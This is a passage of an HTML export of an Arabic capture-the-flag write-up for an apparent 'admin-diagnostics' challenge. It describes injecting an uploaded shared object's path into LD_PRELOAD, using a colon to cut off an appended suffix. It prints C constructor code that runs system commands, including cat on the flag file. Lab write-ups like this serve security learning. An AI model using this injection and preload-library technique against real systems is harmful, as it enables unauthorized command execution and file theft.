+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal style='line-height:115%'><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<br clear=ALL>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد رفع الملف ، نلاحظ بأن
+الـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>Server</span></b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> أخبرنا بمكان الرفع ، وهذا يقدنا للخطوة التالية </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black;background:yellow'>٣ - حقن
+المتغير </span></b><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black;background:yellow'>LD_PRELOAD</span></b><span
+dir=RTL></span><b><span style='font-size:14.0pt;line-height:115%;font-family:
+"Calibri",sans-serif;color:black'><span dir=RTL></span> </span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> نأخذ المسار الذي أخبرنا به
+الـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>Server</span></b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> ونقوم بحقنه في المتغير كالآتي: </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><img width=558 height=174
+src="admin-diagnostics-WRITEUP.fld/image006.png" align=right hspace=12></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span style='position:relative;z-index:251666432'><span
+style='left:0px;position:absolute;left:433px;top:-1418px;width:465px;
+height:113px'>
+
+<table cellpadding=0 cellspacing=0 align=left>
+ <tr>
+  <td width=0 height=0></td>
+  <td width=211></td>
+  <td width=109></td>
+  <td width=145></td>
+ </tr>
+ <tr>
+  <td height=13></td>
+  <td align=left valign=top><img width=211 height=13
+  src="admin-diagnostics-WRITEUP.fld/image007.png"></td>
+ </tr>
+ <tr>
+  <td height=18></td>
+ </tr>
+ <tr>
+  <td height=82></td>
+  <td colspan=2></td>
+  <td align=left valign=top><img width=145 height=82
+  src="admin-diagnostics-WRITEUP.fld/image008.png"></td>
+ </tr>
+</table>
+
+</span></span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal align=right style='text-align:right;line-height:115%'><span
+lang=AR-SA dir=RTL style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>&nbsp;</span></p>
+
+<br clear=ALL>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:#C00000'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><b><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:#C00000'>ملاحظة تخص الحقن:</span></b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;color:#C00000'> </span></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:"Courier New";
+color:black'>o<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>قمنا بإضافة <span style='background:yellow'>:</span>
+في آخر المسار حتى تقطع الجزء الإضافي والذي هو: </span></p>
+
+<p class=MsoNormal style='line-height:115%'><span dir=LTR></span><code><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#DD0000'><span dir=LTR></span>_ENABLE_DIAGNOSTICS=1</span></code></p>
+
+<p class=MsoNormal dir=RTL style='text-align:justify;line-height:115%;
+direction:rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>بعد حقن المتغير
+بالمسار نلاحظ بأنه البرنامج استخدم الـ </span><b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Shared Object </span></b><span dir=RTL></span><b><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> </span></b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>الذي قمنا برفعه! </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>لكن نحتاج الآن قراءة محتوى
+الملف الآتي حتى نحصل على الـ </span><b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>FLAG</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> </span><span
+dir=LTR></span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'><span dir=LTR></span>: </span></p>
+
+<p class=MsoNormal align=right dir=RTL style='text-align:left;line-height:115%;
+direction:rtl;unicode-bidi:embed'><span dir=RTL></span><b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span>_</span></b><b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>flag_943yr93h8u2jfhh93hf34j.TTxTT</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>نقوم بالتعديل على ملف الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>C</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> ونعيد عمل الخطوات من <b>١ - ٣</b> </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>ملف الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>C</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> النهائي: </span></p>
+
+<div align=right>
+
+<table class=MsoTableGrid dir=rtl border=1 cellspacing=0 cellpadding=0
+ style='margin-left:585.3pt;border-collapse:collapse;border:none'>
+ <tr>
+  <td width=539 valign=top style='width:404.2pt;border:solid windowtext 1.0pt;
+  padding:0cm 5.4pt 0cm 5.4pt'>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>#include
+  &lt;stdio.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>#include
+  &lt;string.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>#include
+  &lt;stdlib.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>void
+  __attribute__((constructor)) command();</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>void
+  command (void) {</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>system(&quot;ls&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>system(&quot;pwd&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>system(&quot;whoami&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>system(&quot;cat
+  _flag_943yr93h8u2jfhh93hf34j.TTxTT&quot;);</span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>ونحصل على النتيجة النهائية:</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><img width=258 height=343
+src="admin-diagnostics-WRITEUP.fld/image009.png" align=right hspace=12></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal style='line-height:115%'><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+</div>
+
+</body>
+
+</html>
